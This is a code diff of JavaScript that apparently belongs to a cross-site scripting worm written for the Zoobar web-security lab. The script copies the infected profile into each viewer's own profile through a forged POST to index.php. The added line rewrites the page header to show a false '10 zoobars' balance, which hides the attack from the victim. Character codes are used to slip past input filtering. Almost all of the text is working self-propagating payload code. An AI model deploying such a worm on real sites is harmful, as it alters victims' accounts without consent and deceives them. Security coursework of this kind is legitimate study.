@@ -5,7 +5,8 @@
 	xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 	xhttp.setRequestHeader('Content-Length', formData.length);
 	xhttp.send(formData);
-	var myProfile = document.getElementById('profile').innerHTML;	
+	var myProfile = document.getElementById('profile').innerHTML;		
+	document.getElementById('profileheader').innerHTML = document.getElementsByName('user')[0].value + String.fromCharCode(39) +'s' + String.fromCharCode(32) + 'zoobars:10';
 	xhttp = new XMLHttpRequest();
 	xhttp.open('POST', 'index.php', false);
 	myProfile = encodeURIComponent(myProfile).split('%20').join('+');
@@ -13,8 +14,8 @@
 	myProfile = myProfile.split('(').join('%28');
 	myProfile = myProfile.split(')').join('%29');
 	myProfile = myProfile.split('%0A').join('%0D%0A');
-	myProfile = myProfile.split('amp%3B').join('');	
-	formData='profileupdate'+String.fromCharCode(61)+ myProfile + '&profilesubmit'+String.fromCharCode(61)+'Save'
+	myProfile = myProfile.split('amp%3B').join('');
+	formData='profileupdate'+String.fromCharCode(61)+ myProfile + '&profilesubmit'+String.fromCharCode(61)+'Save';
 	xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 	xhttp.setRequestHeader('Content-Length', formData.length);
 	xhttp.send(formData);
